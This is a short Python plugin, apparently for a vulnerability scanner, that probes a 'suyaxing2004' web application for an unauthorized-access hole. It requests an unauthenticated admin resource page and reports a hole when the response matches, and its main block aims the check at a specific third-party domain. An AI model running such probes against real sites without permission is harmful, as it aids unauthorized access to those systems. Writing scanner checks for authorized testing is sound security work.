#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2010-063128

def assign(service, arg): 
    if service == "suyaxing2004":
        return True, arg
		
def audit(arg): 
    payload = 'ws2004/sysManage/Resource/add/addResource.asp?FunID=1'
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and 'zip' in res:
        security_hole('未经授权访问 '+arg+payload)
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('suyaxing2004', 'http://www.fzjcxx.cn/')[1])
	
